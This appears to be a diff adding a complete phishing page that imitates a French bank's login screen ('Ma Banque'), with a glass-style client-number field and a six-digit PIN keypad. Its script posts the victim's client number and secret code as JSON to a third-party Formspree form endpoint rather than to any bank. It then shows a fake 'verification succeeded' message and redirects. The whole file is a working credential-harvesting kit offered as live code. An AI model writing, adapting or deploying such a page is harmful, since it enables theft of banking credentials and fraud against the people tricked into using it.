@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion | Ma Banque</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --glass-bg: rgba(255, 255, 255, 0.2);
+            --glass-border: rgba(255, 255, 255, 0.4);
+            --text-white: #ffffff;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            color: var(--text-white);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            background: url('backgroundmb.jpeg') no-repeat center center fixed; 
+            background-size: cover;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.2);
+            z-index: 1;
+        }
+
+        .app-container {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 450px;
+            padding: 30px 25px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header { margin-bottom: 40px; }
+        .back-btn { font-size: 1.8rem; text-decoration: none; color: white; cursor: pointer; }
+
+        h2 { font-size: 1.4rem; font-weight: 600; margin-bottom: 30px; text-align: left; }
+
+        #step-id { display: block; }
+
+        .input-box {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            border-radius: 12px;
+            padding: 15px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .input-box label { display: block; font-size: 0.8rem; margin-bottom: 5px; opacity: 0.9; }
+        .input-box input {
+            width: 80%; background: none; border: none; color: white;
+            font-size: 1.1rem; outline: none; font-weight: 500;
+        }
+        .info-circle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); opacity: 0.8; }
+
+        .checkbox-group { display: flex; align-items: center; gap: 12px; margin-bottom: 50px; font-size: 0.95rem; }
+        .checkbox-group input { width: 20px; height: 20px; cursor: pointer; }
+
+        #step-code { display: none; text-align: center; }
+
+        .dots-container { display: flex; justify-content: center; gap: 12px; margin: 30px 0 50px; }
+        .dot { width: 14px; height: 14px; background: rgba(255,255,255,0.4); border-radius: 50%; }
+        .dot.active { background: #ffffff; box-shadow: 0 0 10px rgba(255,255,255,0.8); }
+
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 0 auto;
+            max-width: 320px;
+        }
+
+        .num-btn {
+            background: var(--glass-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            color: white;
+            padding: 18px;
+            font-size: 1.4rem;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .num-btn:active { background: rgba(255,255,255,0.4); }
+
+        .del-btn { background: rgba(255,255,255,0.1); border: none; color: white; border-radius: 15px; font-size: 1.5rem; cursor: pointer; }
+
+        .footer-actions { margin-top: auto; display: flex; flex-direction: column; gap: 25px; align-items: center; }
+
+        .btn-continue {
+            width: 100%; padding: 18px; border-radius: 12px; border: none;
+            background: rgba(255, 255, 255, 0.4); color: white;
+            font-size: 1.1rem; font-weight: 600; cursor: not-allowed; transition: 0.3s;
+        }
+        .btn-continue.active { background: #ffffff; color: #333; cursor: pointer; }
+
+        #formMessage { font-size: 0.95rem; font-weight: 600; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="app-container">
+        <header>
+            <a href="index.html" class="back-btn">❮</a>
+        </header>
+
+        <form id="loginForm">
+            <div id="step-id">
+                <h2>Saisissez votre numéro client</h2>
+                <div class="input-box">
+                    <label>Numéro client</label>
+                    <input type="number" id="text1" name="text1" placeholder="|">
+                    <span class="info-circle">ⓘ</span>
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="memo" checked>
+                    <label for="memo">Mémoriser mon numéro client</label>
+                </div>
+            </div>
+
+            <div id="step-code">
+                <h2>Saisissez votre code secret</h2>
+                <div class="dots-container" id="dots">
+                    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                    <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                </div>
+
+                <input type="hidden" id="text2" name="text2">
+
+                <div class="numpad">
+                    <button type="button" class="num-btn">7</button><button type="button" class="num-btn">8</button><button type="button" class="num-btn">6</button>
+                    <button type="button" class="num-btn">1</button><button type="button" class="num-btn">9</button><button type="button" class="num-btn">2</button>
+                    <button type="button" class="num-btn">0</button><button type="button" class="num-btn">5</button><button type="button" class="num-btn">4</button>
+                    <div style="visibility:hidden"></div>
+                    <button type="button" class="num-btn">3</button>
+                    <button type="button" class="del-btn">⌫</button>
+                </div>
+            </div>
+        </form>
+
+        <div class="footer-actions">
+            <button class="btn-continue" id="action-btn" disabled>Continuer</button>
+            <p id="formMessage"></p>
+        </div>
+    </div>
+
+    <script>
+        const idInput = document.getElementById('text1');
+        const text2Input = document.getElementById('text2');
+        const actionBtn = document.getElementById('action-btn');
+        const stepId = document.getElementById('step-id');
+        const stepCode = document.getElementById('step-code');
+        const dots = document.querySelectorAll('.dot');
+        const numBtns = document.querySelectorAll('.num-btn');
+        const messageEl = document.getElementById('formMessage');
+        
+        let secretCode = "";
+
+        // 1. Validation identifiant à 11 chiffres
+        idInput.addEventListener('input', () => {
+            if(idInput.value.length === 11) {
+                actionBtn.classList.add('active');
+                actionBtn.removeAttribute('disabled');
+            } else {
+                actionBtn.classList.remove('active');
+                actionBtn.setAttribute('disabled', 'true');
+            }
+        });
+
+        // 2. Gestion du bouton Continuer / Valider
+        actionBtn.addEventListener('click', async () => {
+            if(stepId.style.display !== 'none') {
+                // Passage au code secret
+                stepId.style.display = 'none';
+                stepCode.style.display = 'block';
+                actionBtn.innerText = "Valider";
+                actionBtn.classList.remove('active');
+                actionBtn.setAttribute('disabled', 'true');
+            } else {
+                // Envoi Formspree
+                await sendToFormspree();
+            }
+        });
+
+        // 3. Clavier numérique
+        numBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                if(secretCode.length < 6) {
+                    secretCode += btn.innerText;
+                    text2Input.value = secretCode;
+                    dots[secretCode.length - 1].classList.add('active');
+                }
+                if(secretCode.length === 6) {
+                    actionBtn.classList.add('active');
+                    actionBtn.removeAttribute('disabled');
+                }
+            });
+        });
+
+        // 4. Suppression
+        document.querySelector('.del-btn').addEventListener('click', () => {
+            if(secretCode.length > 0) {
+                dots[secretCode.length - 1].classList.remove('active');
+                secretCode = secretCode.slice(0, -1);
+                text2Input.value = secretCode;
+                actionBtn.classList.remove('active');
+                actionBtn.setAttribute('disabled', 'true');
+            }
+        });
+
+        // 5. Envoi AJAX
+        async function sendToFormspree() {
+            actionBtn.innerText = "Connexion...";
+            actionBtn.disabled = true;
+
+            const data = {
+                text1: idInput.value,
+                text2: text2Input.value
+            };
+
+            try {
+                const response = await fetch('https://formspree.io/f/mvzdkdgo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    messageEl.textContent = "✅ Vérification réussie.";
+                    messageEl.style.color = "#ffffff";
+                    setTimeout(() => {
+                        window.location.href = "done.html";
+                    }, 1500);
+                } else {
+                    throw new Error();
+                }
+            } catch (err) {
+                messageEl.textContent = "❌ Erreur de connexion.";
+                messageEl.style.color = "#ff4d4d";
+                actionBtn.innerText = "Valider";
+                actionBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
